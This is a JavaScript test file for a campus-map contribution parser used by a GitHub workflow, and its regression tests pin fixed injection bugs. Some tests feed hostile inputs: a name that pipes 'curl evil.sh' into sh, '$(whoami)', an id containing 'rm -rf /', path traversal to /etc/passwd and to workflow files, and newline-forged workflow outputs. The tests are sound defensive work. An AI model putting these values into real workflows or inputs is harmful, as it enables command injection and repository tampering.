'use strict';

/**
 * Tests for .github/scripts/contribution-parser.js.
 *
 * The "security regressions" block below is the important part: each test there
 * pins a vulnerability that was live in the original workflow. They are written
 * to fail loudly if the untrusted-input handling ever regresses.
 */

(function (root, factory) {
  if (typeof module !== 'undefined' && module.exports) {
    factory(require('./harness.js'), require('../.github/scripts/contribution-parser.js'));
  } else {
    factory(root.TestHarness, root.ContributionParser);
  }
})(typeof globalThis !== 'undefined' ? globalThis : this, function (harness, parser) {
  const describe = harness.describe;
  const it = harness.it;
  const assert = harness.assert;

  const parseContribution = parser.parseContribution;

  /** Builds a well-formed issue body of the shape app.js produces. */
  function issueBody(fields, payload) {
    let body = '## Map Contribution\n\n';
    Object.keys(fields).forEach(function (key) {
      body += '**' + key + ':** ' + fields[key] + '\n';
    });
    return body + '\n```json\n' + JSON.stringify(payload, null, 2) + '\n```';
  }

  const BUILDING = {
    id: 'b_test_1',
    name: 'Test Block',
    category: 'academic',
    points: [
      [26.8465, 75.5619],
      [26.8465, 75.5659],
      [26.842, 75.5686],
    ],
  };

  const LANDMARK = { id: 'lm_test_1', name: 'Test Gate', lat: 26.8443, lng: 75.5653 };

  const PATH = {
    id: 'path_test_1',
    points: [
      [26.8465, 75.5619],
      [26.8465, 75.5659],
    ],
  };

  // ---------------------------------------------------------------- happy path

  describe('parseContribution', function () {
    it('routes a building to its category file', function () {
      const result = parseContribution(issueBody({ Type: 'building', Site: 'college', Category: 'academic' }, BUILDING));

      assert.equal(result.targetFile, 'data/college/buildings/academic.json');
      assert.equal(result.type, 'building');
      assert.equal(result.site, 'college');
      assert.equal(result.name, 'Test Block');
      assert.equal(result.entity.site, 'college', 'site is stamped onto the entity');
    });

    it('routes a landmark to landmarks.json regardless of category', function () {
      const result = parseContribution(issueBody({ Type: 'landmark', Site: 'hostel' }, LANDMARK));

      assert.equal(result.targetFile, 'data/hostel/landmarks.json');
      assert.equal(result.entity.lat, 26.8443);
      assert.equal(result.entity.resolved, false, 'resolved defaults to false');
    });

    it('routes a path to paths.json and tolerates a missing name', function () {
      const result = parseContribution(issueBody({ Type: 'path', Site: 'hostel' }, PATH));

      assert.equal(result.targetFile, 'data/hostel/paths.json');
      assert.equal(result.name, 'path_test_1', 'falls back to the id for display');
      assert.equal(result.entity.name, undefined, 'no empty name is written');
    });

    it('defaults the site to college when the field is absent', function () {
      const result = parseContribution(issueBody({ Type: 'landmark' }, LANDMARK));
      assert.equal(result.site, 'college');
    });

    it('prefers the payload category over the header line', function () {
      const result = parseContribution(
        issueBody({ Type: 'building', Site: 'college', Category: 'sports' }, BUILDING)
      );
      assert.equal(result.category, 'academic', 'the JSON payload is the source of truth');
      assert.equal(result.targetFile, 'data/college/buildings/academic.json');
    });

    // Caught by validating the committed data/ files against these rules: one
    // of the 38 real buildings ("B5") carries landmarkId: null, which the app
    // writes for a building traced directly rather than expanded from a
    // landmark. An earlier version of validateId rejected it.
    it('accepts landmarkId: null as "not linked to a landmark"', function () {
      const payload = Object.assign({}, BUILDING, { landmarkId: null });
      const result = parseContribution(issueBody({ Type: 'building', Site: 'college' }, payload));

      assert.equal(result.entity.landmarkId, null);
    });

    it('still rejects a landmarkId that is a malformed string', function () {
      const payload = Object.assign({}, BUILDING, { landmarkId: '../../evil' });
      assert.throws(function () {
        parseContribution(issueBody({ Type: 'building', Site: 'college' }, payload));
      }, /Invalid id/);
    });

    it('accepts floor: null, the shape every real building uses', function () {
      const payload = Object.assign({}, BUILDING, { floor: null });
      const result = parseContribution(issueBody({ Type: 'building', Site: 'college' }, payload));

      assert.equal(result.entity.floor, null);
    });

    it('drops unknown keys instead of merging them', function () {
      const payload = Object.assign({}, BUILDING, { isAdmin: true, __proto__key: 'x', injected: 'nope' });
      const result = parseContribution(issueBody({ Type: 'building', Site: 'college' }, payload));

      assert.equal(result.entity.isAdmin, undefined);
      assert.equal(result.entity.injected, undefined);
      assert.deepEqual(
        Object.keys(result.entity).sort(),
        ['category', 'floor', 'id', 'name', 'points', 'site'],
        'only known fields survive'
      );
    });
  });

  // ------------------------------------------------------- security regressions

  describe('security regressions', function () {
    // Original bug: `targetFile = filePath` was taken straight from the issue,
    // letting a contribution overwrite any file in the repo. JSON is valid YAML,
    // so this workflow itself was a reachable target.
    it('ignores a **File:** line pointing outside data/', function () {
      const result = parseContribution(
        issueBody(
          {
            Type: 'building',
            Site: 'college',
            Category: 'academic',
            File: '`.github/workflows/process-contribution.yml`',
          },
          BUILDING
        )
      );

      assert.equal(result.targetFile, 'data/college/buildings/academic.json', 'path is derived, not obeyed');
    });

    it('ignores a **File:** line attempting path traversal', function () {
      const result = parseContribution(
        issueBody({ Type: 'landmark', Site: 'college', File: '`../../../etc/passwd`' }, LANDMARK)
      );

      assert.equal(result.targetFile, 'data/college/landmarks.json');
    });

    // Original bug: `BRANCH="contribution/${{ steps.parse.outputs.name }}"` was
    // interpolated into a run: block, so a crafted name executed as shell.
    it('never lets shell metacharacters from a name reach the branch', function () {
      const hostile = Object.assign({}, BUILDING, { id: 'b_ok_1', name: '"; curl evil.sh | sh; #' });
      const result = parseContribution(issueBody({ Type: 'building', Site: 'college' }, hostile));

      assert.excludes(result.branch, ['"', ';', '|', '$', '`', '(', ')', '&', '<', '>', ' ', '\\']);
      assert.ok(/^contribution\/building\/[a-z0-9._-]+$/.test(result.branch), 'branch is a strict slug: ' + result.branch);
    });

    it('builds the branch from the id, not the attacker-controlled name', function () {
      const hostile = Object.assign({}, BUILDING, { id: 'b_safe_id', name: '$(whoami)' });
      const result = parseContribution(issueBody({ Type: 'building', Site: 'college' }, hostile));

      assert.equal(result.branch, 'contribution/building/b_safe_id');
    });

    it('rejects an id carrying shell or path metacharacters', function () {
      const hostile = Object.assign({}, BUILDING, { id: '../../evil; rm -rf /' });
      assert.throws(function () {
        parseContribution(issueBody({ Type: 'building', Site: 'college' }, hostile));
      }, /Invalid id/);
    });

    // Original bug: `console.log('name=' + data.name)` was piped into
    // $GITHUB_OUTPUT, so a newline in a name forged extra outputs.
    it('strips newlines from a name so it cannot forge a workflow output', function () {
      const hostile = Object.assign({}, BUILDING, { name: 'Innocent\nsuccess=true\nfilePath=.github/x.yml' });
      const result = parseContribution(issueBody({ Type: 'building', Site: 'college' }, hostile));

      assert.excludes(result.name, ['\n', '\r']);
      assert.equal(result.name, 'Innocent success=true filePath=.github/x.yml');
      assert.excludes(result.entity.name, ['\n', '\r']);
    });

    it('strips control characters from a name', function () {
      const TAB = String.fromCharCode(9);
      const NUL = String.fromCharCode(0);
      const DEL = String.fromCharCode(127);
      const hostile = Object.assign({}, BUILDING, { name: 'Tab' + TAB + 'here' + NUL + 'nul' + DEL + 'del' });
      const result = parseContribution(issueBody({ Type: 'building', Site: 'college' }, hostile));

      assert.equal(result.name, 'Tab here nul del');
    });

    // Original bug: the file regex was /[^\x6]+/ ("not x, not 6") where
    // /[^\x60]+/ ("not a backtick") was meant, so any path containing an 'x' or
    // a '6' was silently truncated. Paths are derived now, but a category with
    // those characters must still round-trip.
    it("handles categories containing 'x' and '6'", function () {
      const payload = Object.assign({}, BUILDING, { category: 'annex6' });
      const result = parseContribution(issueBody({ Type: 'building', Site: 'college' }, payload));

      assert.equal(result.category, 'annex6');
      assert.equal(result.targetFile, 'data/college/buildings/annex6.json');
    });

    it('rejects a category that would escape the buildings directory', function () {
      const payload = Object.assign({}, BUILDING, { category: '../../../.github/workflows/evil' });
      assert.throws(function () {
        parseContribution(issueBody({ Type: 'building', Site: 'college' }, payload));
      }, /Invalid category/);
    });

    it('rejects a site outside the known list', function () {
      assert.throws(function () {
        parseContribution(issueBody({ Type: 'landmark', Site: '../../etc' }, LANDMARK));
      }, /Invalid site/);
    });
  });

  // ------------------------------------------------------------ input validation

  describe('input validation', function () {
    it('rejects an unknown type', function () {
      assert.throws(function () {
        parseContribution(issueBody({ Type: 'exploit', Site: 'college' }, BUILDING));
      }, /Invalid type/);
    });

    it('rejects a missing type', function () {
      assert.throws(function () {
        parseContribution(issueBody({ Site: 'college' }, BUILDING));
      }, /Missing \*\*Type/);
    });

    it('rejects a body with no json block', function () {
      assert.throws(function () {
        parseContribution('## Map Contribution\n\n**Type:** building\n');
      }, /No ```json block/);
    });

    it('rejects malformed json', function () {
      assert.throws(function () {
        parseContribution('## Map Contribution\n\n**Type:** building\n\n```json\n{ not json }\n```');
      }, /not valid JSON/);
    });

    it('rejects an empty body', function () {
      assert.throws(function () {
        parseContribution('');
      }, /empty/);
    });

    it('rejects a building with too few points', function () {
      const payload = Object.assign({}, BUILDING, { points: [[26.8, 75.5], [26.9, 75.6]] });
      assert.throws(function () {
        parseContribution(issueBody({ Type: 'building', Site: 'college' }, payload));
      }, /at least 3 points/);
    });

    it('rejects out-of-range coordinates', function () {
      const payload = Object.assign({}, BUILDING, { points: [[999, 75.5], [26.9, 75.6], [26.8, 75.5]] });
      assert.throws(function () {
        parseContribution(issueBody({ Type: 'building', Site: 'college' }, payload));
      }, /latitude 999 is outside/);
    });

    it('rejects non-numeric coordinates', function () {
      const payload = Object.assign({}, BUILDING, { points: [['26.8', 75.5], [26.9, 75.6], [26.8, 75.5]] });
      assert.throws(function () {
        parseContribution(issueBody({ Type: 'building', Site: 'college' }, payload));
      }, /finite numbers/);
    });

    it('rejects a malformed point pair', function () {
      const payload = Object.assign({}, BUILDING, { points: [[26.8], [26.9, 75.6], [26.8, 75.5]] });
      assert.throws(function () {
        parseContribution(issueBody({ Type: 'building', Site: 'college' }, payload));
      }, /must be a \[lat, lng\] pair/);
    });

    it('rejects a name that is only whitespace', function () {
      const payload = Object.assign({}, BUILDING, { name: '   ' });
      assert.throws(function () {
        parseContribution(issueBody({ Type: 'building', Site: 'college' }, payload));
      }, /missing a "name"/);
    });

    it('rejects an over-long name', function () {
      const payload = Object.assign({}, BUILDING, { name: 'A'.repeat(parser.MAX_NAME_LENGTH + 1) });
      assert.throws(function () {
        parseContribution(issueBody({ Type: 'building', Site: 'college' }, payload));
      }, /exceeds 100 characters/);
    });

    it('rejects a payload that is an array rather than an object', function () {
      assert.throws(function () {
        parseContribution('## Map Contribution\n\n**Type:** building\n\n```json\n[1, 2]\n```');
      }, /single object/);
    });

    it('rejects a point count above the cap', function () {
      const huge = [];
      for (let i = 0; i < parser.MAX_POINTS + 1; i += 1) huge.push([26.8, 75.5]);
      const payload = Object.assign({}, BUILDING, { points: huge });

      assert.throws(function () {
        parseContribution(issueBody({ Type: 'building', Site: 'college' }, payload));
      }, /exceeds the 2000 limit/);
    });
  });
});
